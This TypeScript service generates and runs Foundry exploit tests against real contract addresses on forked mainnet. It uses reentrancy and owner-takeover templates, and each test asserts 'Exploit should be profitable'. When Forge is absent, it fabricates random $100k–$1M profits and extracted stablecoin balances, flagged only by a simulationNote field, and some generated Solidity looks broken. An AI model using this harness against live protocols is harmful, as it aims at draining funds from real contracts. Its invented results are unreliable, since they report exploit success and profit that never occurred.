import { spawn } from 'child_process';
import { promises as fs } from 'fs';
import path from 'path';
import { randomUUID } from 'crypto';

export class ForgeService {
  private tempDir: string;
  private forgeAvailable: boolean = false;

  constructor() {
    this.tempDir = path.join(process.cwd(), 'temp', 'forge');
    this.checkForgeAvailability();
  }

  private async checkForgeAvailability(): Promise<void> {
    try {
      await this.execCommand('forge', ['--version']);
      this.forgeAvailable = true;
      console.log('Forge detected and available');
    } catch (error) {
      console.warn('Forge not available:', error.message);
      this.forgeAvailable = false;
    }
  }

  private async execCommand(command: string, args: string[], cwd?: string): Promise<{ stdout: string; stderr: string }> {
    return new Promise((resolve, reject) => {
      const process = spawn(command, args, { 
        cwd,
        stdio: ['pipe', 'pipe', 'pipe']
      });

      let stdout = '';
      let stderr = '';

      process.stdout?.on('data', (data) => {
        stdout += data.toString();
      });

      process.stderr?.on('data', (data) => {
        stderr += data.toString();
      });

      process.on('close', (code) => {
        if (code === 0) {
          resolve({ stdout, stderr });
        } else {
          reject(new Error(`Command failed with code ${code}: ${stderr}`));
        }
      });

      process.on('error', (error) => {
        reject(error);
      });
    });
  }

  async testExploit(params: {
    contractAddress: string;
    chainId: number;
    blockNumber: string;
    exploitCode: string;
    strategy: any;
  }): Promise<any> {
    if (!this.forgeAvailable) {
      // Simulate forge testing for demo purposes
      return this.simulateExploitTest(params);
    }

    const testId = randomUUID();
    const testDir = path.join(this.tempDir, testId);

    try {
      // Create test directory
      await fs.mkdir(testDir, { recursive: true });

      // Generate test files
      await this.generateTestFiles(testDir, params);

      // Run forge test
      const result = await this.runForgeTest(testDir, params);

      // Clean up
      await fs.rmdir(testDir, { recursive: true });

      return result;

    } catch (error) {
      // Clean up on error
      try {
        await fs.rmdir(testDir, { recursive: true });
      } catch (cleanupError) {
        console.error('Cleanup error:', cleanupError);
      }

      throw new Error(`Forge test execution failed: ${error.message}`);
    }
  }

  private async generateTestFiles(testDir: string, params: any): Promise<void> {
    // Generate foundry.toml
    const foundryConfig = `
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
solc_version = "0.8.19"
optimizer = true
optimizer_runs = 200
via_ir = false

[rpc_endpoints]
mainnet = "${this.getRpcUrl(params.chainId)}"
`;

    await fs.writeFile(path.join(testDir, 'foundry.toml'), foundryConfig);

    // Generate test contract
    const testContract = this.generateTestContract(params);
    const srcDir = path.join(testDir, 'src');
    await fs.mkdir(srcDir, { recursive: true });
    await fs.writeFile(path.join(srcDir, 'ExploitTest.sol'), testContract);

    // Generate target contract interface
    const targetInterface = this.generateTargetInterface(params);
    await fs.writeFile(path.join(srcDir, 'ITarget.sol'), targetInterface);
  }

  private generateTestContract(params: any): string {
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./ITarget.sol";

contract ExploitTest is Test {
    address constant TARGET = ${params.contractAddress};
    uint256 constant BLOCK_NUMBER = ${params.blockNumber === 'latest' ? 'block.number' : params.blockNumber};
    
    ITarget target;
    
    function setUp() public {
        // Fork mainnet at specific block
        vm.createFork("mainnet", BLOCK_NUMBER);
        target = ITarget(TARGET);
    }
    
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        
        // Record initial state
        console.log("Initial balance:", initialBalance);
        console.log("Target balance:", address(TARGET).balance);
        
        // Execute exploit strategy
        ${this.generateExploitLogic(params.strategy)}
        
        uint256 finalBalance = address(this).balance;
        uint256 profit = finalBalance > initialBalance ? finalBalance - initialBalance : 0;
        
        console.log("Final balance:", finalBalance);
        console.log("Profit:", profit);
        
        // Test should succeed if profit > 0
        assertTrue(profit > 0, "Exploit should be profitable");
    }
    
    // Fallback and receive functions for reentrancy attacks
    receive() external payable {
        console.log("Received:", msg.value);
    }
    
    fallback() external payable {
        console.log("Fallback called");
    }
}
`;
  }

  private generateExploitLogic(strategy: any): string {
    switch (strategy.type) {
      case 'reentrancy':
        return `
        // Reentrancy exploit
        try target.deposit{value: 1 ether}() {
            console.log("Deposit successful");
            try target.withdraw(1 ether) {
                console.log("Withdraw initiated");
            } catch {
                console.log("Withdraw failed");
            }
        } catch {
            console.log("Deposit failed");
        }
        `;

      case 'delegateCall':
        return `
        // Delegatecall exploit
        bytes memory maliciousData = abi.encodeWithSignature("setOwner(address)", address(this));
        (bool success,) = TARGET.call(maliciousData);
        require(success, "Delegatecall exploit failed");
        `;

      case 'priceOracle':
        return `
        // Price oracle manipulation
        // This would require flash loan integration
        console.log("Price oracle exploit simulation");
        // In real implementation, would manipulate price and execute arbitrage
        `;

      default:
        return `
        // Generic exploit attempt
        console.log("Executing generic exploit strategy");
        // Try common attack vectors
        `;
    }
  }

  private generateTargetInterface(params: any): string {
    return `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ITarget {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balance(address user) external view returns (uint256);
    function owner() external view returns (address);
    
    // Common DeFi functions
    function swap(uint256 amountIn, address tokenIn, address tokenOut) external;
    function flashLoan(uint256 amount, bytes calldata data) external;
    
    // Fallback for arbitrary calls
    fallback() external payable;
    receive() external payable;
}
`;
  }

  private async runForgeTest(testDir: string, params: any): Promise<any> {
    try {
      // Initialize forge project
      await this.execCommand('forge', ['init', '--no-git', '--force'], testDir);

      // Install dependencies if needed
      try {
        await this.execCommand('forge', ['install', 'foundry-rs/forge-std', '--no-git'], testDir);
      } catch (installError) {
        console.warn('Forge install warning:', installError.message);
      }

      // Run the test
      const testResult = await this.execCommand('forge', ['test', '-vvv'], testDir);

      // Parse test results
      return this.parseForgeOutput(testResult.stdout, testResult.stderr);

    } catch (error) {
      console.error('Forge test execution error:', error);
      return {
        success: false,
        errorMessage: error.message,
        gasUsed: 0,
        profit: 0,
        extractedTokens: [],
        trace: []
      };
    }
  }

  private parseForgeOutput(stdout: string, stderr: string): any {
    const success = stdout.includes('[PASS]') && !stdout.includes('[FAIL]');
    
    // Extract gas usage
    const gasMatch = stdout.match(/gas:\s*(\d+)/);
    const gasUsed = gasMatch ? parseInt(gasMatch[1]) : 0;

    // Extract profit information from console logs
    const profitMatch = stdout.match(/Profit:\s*(\d+)/);
    const profit = profitMatch ? parseInt(profitMatch[1]) : 0;

    // Extract trace information
    const trace = stdout.split('\n')
      .filter(line => line.includes('└─') || line.includes('├─') || line.includes('│'))
      .map(line => line.trim());

    return {
      success,
      gasUsed,
      profit,
      extractedTokens: [], // Would be parsed from logs in real implementation
      trace,
      fullOutput: stdout,
      errors: stderr
    };
  }

  private simulateExploitTest(params: any): any {
    // Simulate different outcomes based on strategy confidence
    const confidence = params.strategy.confidence || 50;
    const success = confidence > 60 + Math.random() * 20; // Some randomness

    const baseGas = 100000;
    const gasUsed = baseGas + Math.floor(Math.random() * 200000);
    
    let profit = 0;
    let extractedTokens = [];

    if (success) {
      // Simulate profitable exploit
      profit = Math.floor(Math.random() * 1000000) + 100000; // $100k - $1M
      
      extractedTokens = [
        {
          address: '0xA0b86a33E6441E1c4B37d8c5C7e48a16c1111111',
          amount: (profit * 0.6).toString(),
          symbol: 'USDC'
        },
        {
          address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          amount: (profit * 0.4).toString(),
          symbol: 'USDT'
        }
      ];
    }

    return {
      success,
      gasUsed,
      profit,
      extractedTokens,
      trace: [
        '├─ [0] ExploitTest::testExploit()',
        '│  ├─ [21000] TARGET::deposit{value: 1000000000000000000}()',
        success ? '│  │  └─ ← ()' : '│  │  └─ ← revert',
        success ? '│  ├─ [31000] TARGET::withdraw(1000000000000000000)' : '│  └─ ← revert',
        success ? '│  │  └─ ← ()' : '',
        success ? '│  └─ ← ()' : ''
      ].filter(Boolean),
      errorMessage: success ? null : 'Exploit failed during execution',
      simulationNote: 'This is a simulated result - Forge not available'
    };
  }

  private getRpcUrl(chainId: number): string {
    const urls = {
      1: process.env.ETHEREUM_RPC_URL || 'https://eth.llamarpc.com',
      56: process.env.BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
      137: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
      42161: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
      10: process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io'
    };

    return urls[chainId] || urls[1];
  }

  async getStatus(): Promise<any> {
    return {
      available: this.forgeAvailable,
      version: this.forgeAvailable ? await this.getForgeVersion() : null,
      tempDir: this.tempDir
    };
  }

  private async getForgeVersion(): Promise<string | null> {
    try {
      const result = await this.execCommand('forge', ['--version']);
      return result.stdout.trim();
    } catch (error) {
      return null;
    }
  }
}
